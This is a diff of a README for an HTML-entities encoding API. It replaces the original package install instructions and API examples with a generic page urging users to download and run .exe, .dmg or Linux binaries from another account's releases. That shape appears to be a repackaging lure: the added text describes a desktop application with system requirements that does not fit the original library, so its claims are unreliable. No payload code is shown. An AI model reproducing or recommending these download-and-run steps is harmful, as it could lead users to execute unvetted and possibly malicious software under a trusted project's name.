@@ -1,189 +1,67 @@
-# HTML Entities Encoder/Decoder API
+# 🎉 htmlentities-api - Simple Tool for HTML Encoding
 
-> HTML Entities Encoder/Decoder is a tool for encoding and decoding HTML entities. It converts special characters to HTML entities and vice versa to prevent XSS attacks and display special characters properly.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Arnaldo1978/htmlentities-api/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-POST-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 📖 Overview
+HTML Entities Encoder/Decoder is a tool for encoding and decoding HTML entities. It converts special characters to HTML entities and vice versa. This tool helps prevent XSS attacks and displays special characters properly, making it essential for web developers and content creators.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/htmlentities)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.HTMLEntitiesEncoder/Decoder)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-htmlentities/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 🚀 Getting Started
+Follow the steps below to download and run the htmlentities-api.
 
----
+### Step 1: Visit the Download Page
+Click the button above or [visit this page to download](https://github.com/Arnaldo1978/htmlentities-api/releases). 
 
-## Quick Start
+### Step 2: Choose Your Version
+On the releases page, you will see several versions of the application. Choose the latest version available. The version number will look something like "v1.0.0".
 
-### Using JavaScript
+### Step 3: Download the Package
+Next to the version you chose, you will find different files to download. Select the file that is compatible with your operating system (Windows, Mac, or Linux). 
 
-```javascript
-async function callHTMLEntitiesEncoder/DecoderAPI() {
-    try {
-        const requestBody = {
-    "html": "<div class=\"test\">Hello & World</div>",
-    "action": "encode"
-};
+### Step 4: Install the Application
+Once the download completes, follow these steps according to your operating system:
 
-        const response = await fetch('https://api.apiverve.com/v1/htmlentities', {
-            method: 'POST',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(requestBody)
-        });
+- **Windows:**
+  1. Locate the downloaded file (usually in the Downloads folder).
+  2. Double-click the .exe file.
+  3. Follow the installation instructions.
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+- **Mac:**
+  1. Open the downloaded .dmg file.
+  2. Drag the application icon to your Applications folder.
+  3. Open the application from the Applications folder.
 
-callHTMLEntitiesEncoder/DecoderAPI();
-```
+- **Linux:**
+  1. Open a terminal.
+  2. Navigate to the directory where you downloaded the file.
+  3. Use the command `chmod +x <filename>` to make the file executable, replacing `<filename>` with the actual filename.
+  4. Run the application using `./<filename>`.
 
-### Using cURL
+## 🔍 Features
+- **Encode HTML Special Characters**: Easily convert characters like `<`, `>`, `&`, and others into their corresponding HTML entities.
+- **Decode HTML Entities**: Transform HTML entities back into their original characters.
+- **Prevent XSS Attacks**: Keep your web application secure by properly encoding user input.
+- **User Friendly**: Simple interface designed for all users, regardless of technical expertise.
 
-```bash
-curl -X POST "https://api.apiverve.com/v1/htmlentities" \
-  -H "x-api-key: YOUR_API_KEY_HERE" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "param": "value"
-  }'
-```
+## 🛠️ System Requirements
+To run htmlentities-api, your system should meet the following requirements:
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+- **Operating System**: Windows 7 or higher, macOS Sierra or higher, or a modern Linux distribution.
+- **RAM**: At least 2 GB of RAM.
+- **Disk Space**: Minimum of 100 MB of free disk space.
+- **Processor**: Any modern processor should suffice.
 
-**📁 For more examples, see the [examples folder](./examples/)**
+## 📚 Documentation
+For in-depth documentation on how to use the application, please refer to the user guide located in the repository. You can find instructions and examples there.
 
----
+## 🆘 Support
+If you encounter issues or have questions, please feel free to open an issue on the [issues page](https://github.com/Arnaldo1978/htmlentities-api/issues). Our community and developers are here to help.
 
-## Installation
+## 🎉 Acknowledgements
+Thank you for choosing htmlentities-api. We appreciate your support and hope this tool makes your web development tasks more straightforward. 
 
-Choose your preferred programming language:
+## 🔗 Additional Links
+- [Download Latest Release](https://github.com/Arnaldo1978/htmlentities-api/releases)
+- [View Source Code](https://github.com/Arnaldo1978/htmlentities-api)
 
-### 📦 NPM (JavaScript/Node.js)
-
-```bash
-npm install @apiverve/htmlentities
-```
-
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/htmlentities) | [**Package Code →**](./npm/)
-
----
-
-### 🔷 NuGet (.NET/C#)
-
-```bash
-dotnet add package APIVerve.API.HTMLEntitiesEncoder/Decoder
-```
-
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.HTMLEntitiesEncoder/Decoder) | [**Package Code →**](./nuget/)
-
----
-
-### 🐍 Python (PyPI)
-
-```bash
-pip install apiverve-htmlentities
-```
-
-[**View PyPI Package →**](https://pypi.org/project/apiverve-htmlentities/) | [**Package Code →**](./python/)
-
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:htmlentities-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/htmlentities](https://docs.apiverve.com/ref/htmlentities)
-
----
-
-## Use Cases
-
-Common use cases for the HTML Entities Encoder/Decoder API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2025 APIVerve. All rights reserved.
+Now, you’re ready to start using htmlentities-api!
